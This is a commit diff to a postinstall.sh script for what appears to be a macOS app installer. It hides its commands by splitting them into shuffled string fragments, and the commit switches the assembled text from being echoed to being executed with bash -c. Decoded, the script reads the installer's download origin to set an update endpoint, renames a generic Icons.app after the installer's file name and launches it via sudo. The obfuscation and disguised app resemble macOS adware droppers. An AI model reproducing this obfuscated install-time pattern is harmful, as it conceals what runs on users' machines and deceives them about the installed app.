278f4af25b9a92e9d872d0ac53067e87de6e7b33
Munir Ahmed <mnirahd@gmail.com>
2023-08-06 04:13:53 +0100

    postinstall.sh

--- postinstall.sh
+++ postinstall.sh
@@ -1,8 +1,6 @@
 #!/bin/bash
 z="
-";bz='/.*/';BBz=' -E ';sz='/.*\';oz='pp /';Cz='PPCA';Sz='-n "';IBz='ons/';Xz='| se';Dz='ST_E';dz='`/ap';Rz='sed ';UBz='.app';KBz='o $o';Uz='\"]/';Tz='s/[ ';Fz='INT=';qz='ho $';jz='icat';nz='te.a';Az='expo';yz='p';rz='one ';tz='/\([';Ez='NDPO';JBz='`ech';OBz='.*\/';VBz='exit';CBz='-u $';fz='t.xm';Oz='aw "';Vz='/g; ';vz='-]*\';EBz=' ope';ez='pcas';wz=').*/';iz='Appl';NBz=' '\''s/';GBz='ppli';Hz='s -n';Jz='kMDI';xz='`.ap';Lz='here';Kz='temW';cz='\1/'\''';Mz='From';LBz='ne |';az='*\)\';SBz='.*/\';hz='mv /';pz='/`ec';QBz=' /.-';PBz='\([^';RBz=']*\)';WBz=' 0';TBz='1/'\''`';ABz='sudo';Yz='d '\''s';Iz='ame ';mz='cula';Bz='rt A';Qz='" | ';kz='ions';HBz='cati';Zz='/\(.';lz='/Cal';DBz='USER';FBz='n /A';Gz='`mdl';Pz='$one';MBz=' sed';Wz='2p" ';gz='l';uz='^ /.';Nz='s -r';
+";BBz=' sed';Tz='s/[ ';Vz='/g; ';sz='s.ap';Sz='-n "';JBz='.app';nz='Appl';CBz=' '\''s/';Wz='2p" ';KBz='sudo';Mz='From';wz='ons/';Rz='sed ';ez='pcas';Nz='s -r';uz='ppli';qz='/App';Kz='temW';tz='p /A';Uz='\"]/';DBz='.*\/';MBz='-u $';Yz='d '\''s';yz='o $o';NBz='USER';Gz='`mdl';az='*\)\';jz='INT"';vz='cati';Fz='INT=';FBz=' /.-';Az='expo';Cz='PPCA';OBz=' ope';Lz='here';PBz='n /A';GBz=']*\)';HBz='.*/\';Zz='/\(.';Ez='NDPO';Pz='$one';Dz='ST_E';dz='`/ap';iz=' "$A';Qz='" | ';Oz='aw "';Jz='kMDI';Xz='| se';LBz=' -E ';EBz='\([^';Hz='s -n';IBz='1/'\''`';Bz='rt A';Iz='ame ';rz='Icon';fz='t.xm';oz='icat';ABz='ne |';cz='\1/'\''';bz='/.*/';RBz=' 0';kz=' "$o';mz='mv /';pz='ions';lz='ne"';gz='l';xz='`ech';QBz='exit';hz='echo';
 export one="$1"
-
-echo "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$iz$jz$kz$pz$qz$rz$Xz$Yz$sz$tz$uz$vz$wz$cz$xz$yz$z$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$z$VBz$WBz"
-
+bash -c "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$Cz$Dz$Ez$jz$z$hz$kz$lz$z$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$z$KBz$LBz$MBz$NBz$OBz$PBz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$z$QBz$RBz"
 
